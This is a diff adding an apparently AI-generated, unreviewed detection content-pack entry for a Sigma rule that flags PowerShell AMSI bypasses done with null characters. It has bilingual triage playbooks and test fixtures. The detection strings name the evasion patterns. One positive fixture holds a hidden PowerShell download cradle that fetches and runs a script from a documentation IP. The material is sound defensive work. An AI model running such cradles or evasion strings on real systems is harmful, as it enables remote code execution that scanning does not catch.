@@ -1,0 +1,128 @@
+{
+  "rule": {
+    "id": "92a974db-ab84-457f-9ec0-55db83d7a825",
+    "title": "Potential AMSI Bypass Using NULL Bits",
+    "level": "medium",
+    "status": "test",
+    "author": "Nasreddine Bencherchali (Nextron Systems)",
+    "path": "windows/process_creation/proc_creation_win_powershell_amsi_null_bits_bypass.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/windows/process_creation/proc_creation_win_powershell_amsi_null_bits_bypass.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1685"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se inició un proceso cuya línea de comandos contiene un patrón conocido de ofuscación con caracteres nulos, usado para que contenido de PowerShell evada el análisis de AMSI. Trátelo como posible evasión de defensas hasta demostrar que es legítimo.",
+      "what_it_detects": "Eventos de creación de procesos cuyo CommandLine contiene la cadena \"if(0){{{0}}}' -f $(0 -as [char]) +\" o \"#<NULL>\". Son técnicas públicas de ofuscación que insertan caracteres NULL en código PowerShell para que los escáneres basados en AMSI pasen por alto la parte maliciosa.",
+      "why_it_matters": "AMSI permite al antivirus y al EDR inspeccionar el contenido de los scripts en tiempo de ejecución. Evadirlo deja correr payloads en memoria, download cradles o herramientas de post-explotación sin inspección. La regla corresponde a ATT&CK T1685 (deterioro de defensas).",
+      "triage_steps": [
+        "Lea el CommandLine completo y decodifique cualquier base64 o cadena concatenada. Identifique el código que sigue al patrón de bits nulos y qué pretende ejecutar.",
+        "Revise Image y ParentImage. Un PowerShell iniciado por Office, un navegador, wscript, mshta o una cuenta de servicio es más sospechoso que la consola interactiva de un administrador.",
+        "Identifique el User y confirme con el titular de la cuenta o su equipo si ejecutó el comando. Anote el tipo de inicio de sesión y el host de origen.",
+        "Pivote en el mismo host +/- 15 minutos: procesos hijo, conexiones de red, escritura de archivos, tareas programadas o servicios nuevos y logs de ScriptBlock de PowerShell (4104).",
+        "Busque conexiones salientes a dominios o IP desconocidos y archivos descargados. Compare sus hash con inteligencia de amenazas.",
+        "Busque alertas previas y el mismo patrón de línea de comandos en otros endpoints y usuarios para saber si el caso es aislado o extendido."
+      ],
+      "false_positives": [
+        "La regla no indica falsos positivos conocidos. Se esperan muy pocos.",
+        "Ejercicios de red team, pruebas de penetración o purple team que prueban a propósito evasiones de AMSI.",
+        "Investigadores de seguridad o ingenieros de detección que reproducen muestras públicas de ofuscación en un laboratorio o host de pruebas."
+      ],
+      "response_steps": [
+        "Verifique con el usuario y con las pruebas de seguridad planificadas. Si nadie puede explicar la actividad, escálela como probable compromiso.",
+        "Aísle el endpoint mediante el EDR y preserve la memoria, los logs de PowerShell y los archivos descargados antes de remediar.",
+        "Deshabilite o restablezca las credenciales de la cuenta involucrada si es probable un uso indebido, y revise su actividad reciente en otros sistemas.",
+        "Elimine la persistencia y los artefactos maliciosos encontrados. Bloquee los dominios, IP y hash relacionados, luego restaure el host y vigile si la actividad se repite."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque estas cadenas casi no aparecen en la administración normal, pero por sí sola la alerta muestra un intento de evasión, no un payload ni un impacto confirmados."
+    },
+    "en": {
+      "summary": "A process started with a command line containing a known null-character obfuscation pattern used to slip PowerShell content past AMSI scanning. Treat it as possible defense evasion until you can show it is legitimate.",
+      "what_it_detects": "Process creation events where CommandLine contains the string \"if(0){{{0}}}' -f $(0 -as [char]) +\" or \"#<NULL>\". These are public obfuscation techniques that put NULL characters into PowerShell code so AMSI-based scanners can miss the malicious part.",
+      "why_it_matters": "AMSI lets antivirus and EDR inspect script content at runtime. Bypassing it allows in-memory payloads, download cradles or post-exploitation tools to run without being inspected. The rule maps to ATT&CK T1685 (defense impairment).",
+      "triage_steps": [
+        "Read the full CommandLine and decode any base64 or concatenated strings. Identify the code that follows the null-bit pattern and what it is meant to run.",
+        "Check Image and ParentImage. A PowerShell process started by Office, a browser, wscript, mshta or a service account is more suspicious than one started by an admin's interactive console.",
+        "Identify the User and confirm with the account owner or their team whether they ran this command. Note logon type and source host.",
+        "Pivot on the same host within +/- 15 minutes: child processes, network connections, file writes, new scheduled tasks or services, and PowerShell ScriptBlock logs (4104).",
+        "Look for outbound connections to unknown domains or IPs and for downloaded files. Check their hashes against threat intelligence.",
+        "Search for earlier alerts and the same command-line pattern on other endpoints and users to judge whether this is isolated or widespread."
+      ],
+      "false_positives": [
+        "The rule lists no known false positives. Expect very few.",
+        "Red team, penetration test or purple team exercises that deliberately test AMSI bypasses.",
+        "Security researchers or detection engineers reproducing public obfuscation samples in a lab or test host."
+      ],
+      "response_steps": [
+        "Check with the user and any planned security testing. If nobody can account for it, escalate it as a likely compromise.",
+        "Isolate the endpoint through EDR, and preserve memory, PowerShell logs and any dropped files before you remediate.",
+        "Disable or reset credentials for the involved account if misuse is likely, and review its recent activity on other systems.",
+        "Remove persistence and malicious artifacts you find. Block related domains, IPs and hashes, then restore the host and watch it for recurrence."
+      ],
+      "severity_rationale": "Medium fits because these strings rarely appear in normal admin work, but on its own the alert shows an attempted evasion, not a confirmed payload or impact."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "PowerShell launched by Word, building a string with the null-char format pattern before invoking it",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0142.andes.example.com",
+          "User": "ANDES\\jperez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+          "CommandLine": "powershell.exe -NoP -W Hidden -c \"$s = 'if(0){{{0}}}' -f $(0 -as [char]) + 'Write-Output placeholder'; iex $s\"",
+          "ProcessId": 6120
+        }
+      },
+      {
+        "description": "PowerShell command prefixed with the #<NULL> marker followed by a download cradle to a documentation IP",
+        "event": {
+          "EventID": 1,
+          "Computer": "WS-0207.andes.example.com",
+          "User": "ANDES\\mrojas",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+          "CommandLine": "powershell.exe -ep bypass -c \"#<NULL>; IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.10/a.ps1')\"",
+          "ProcessId": 4388
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Legitimate admin script using the PowerShell -f format operator without the null-char pattern",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-FS01.andes.example.com",
+          "User": "ANDES\\adm_lgomez",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\explorer.exe",
+          "CommandLine": "powershell.exe -c \"'Report generated on {0}' -f (Get-Date) | Out-File C:\\Reports\\status.txt\"",
+          "ProcessId": 2290
+        }
+      },
+      {
+        "description": "Script with a comment about NULL values that does not contain the literal #<NULL> marker",
+        "event": {
+          "EventID": 1,
+          "Computer": "SRV-APP02.andes.example.com",
+          "User": "ANDES\\svc_backup",
+          "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+          "ParentImage": "C:\\Windows\\System32\\svchost.exe",
+          "CommandLine": "powershell.exe -File C:\\Scripts\\cleanup.ps1 -Note \"# NULL values are skipped\"",
+          "ProcessId": 5012
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-26T02:47:30+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
